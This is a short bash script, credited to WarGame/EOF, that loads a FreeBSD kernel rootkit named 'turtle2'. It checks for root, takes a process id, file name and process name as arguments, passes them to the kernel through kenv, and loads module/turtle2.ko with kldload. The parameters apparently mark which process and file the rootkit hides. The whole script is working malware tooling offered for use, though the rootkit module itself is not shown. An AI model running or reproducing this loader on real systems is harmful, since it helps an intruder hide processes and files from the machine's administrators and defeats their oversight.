#!/usr/local/bin/bash

# simple script to load the turtle2 rootkit by WarGame/EOF

if [ $EUID -ne 0 ];
then
	echo "You must be root!"
	exit -1
fi

if [ $# -lt 3 ];
then
	echo "Pass pid, file and pname!"
	exit -1
fi

echo "loading turtle2 with pid=$1 and file=$2 and pname=$3"

kenv turtle2.pid=$1 
kenv turtle2.file=$2
kenv turtle2.pname=$3
kldload module/turtle2.ko


